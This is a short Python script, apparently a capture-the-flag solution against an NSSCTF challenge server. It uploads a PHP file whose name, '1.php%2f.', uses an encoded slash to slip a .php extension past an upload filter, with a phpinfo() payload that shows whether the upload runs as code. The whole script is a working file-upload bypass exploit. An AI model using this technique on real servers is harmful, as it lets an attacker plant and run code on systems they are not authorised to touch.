import requests

url = 'http://node5.anna.nssctf.cn:28389/'
file_content = "<?php phpinfo();?>'"
file = {'file': ('1.php%2f.', file_content)}
response = requests.post(url, files=file)
print(response.text)